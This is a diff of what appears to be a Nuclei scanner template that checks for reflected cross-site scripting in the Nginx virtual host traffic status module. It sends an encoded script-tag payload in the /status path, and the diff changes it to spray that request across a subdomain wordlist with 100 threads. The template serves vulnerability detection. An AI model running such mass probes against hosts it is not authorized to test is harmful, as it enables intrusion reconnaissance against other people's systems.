@@ -1,16 +1,26 @@
 id: nginx-module-vts-xss
 
 info:
-  name: Nginx Virtual Host Traffic Status Module - Cross-Site Scripting
+  name: Nginx virtual host traffic status module XSS
   author: madrobot
   severity: medium
-  tags: nginx,xss,status
+  tags: nginx,xss
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
     matchers-condition: and
     matchers:
       - type: status
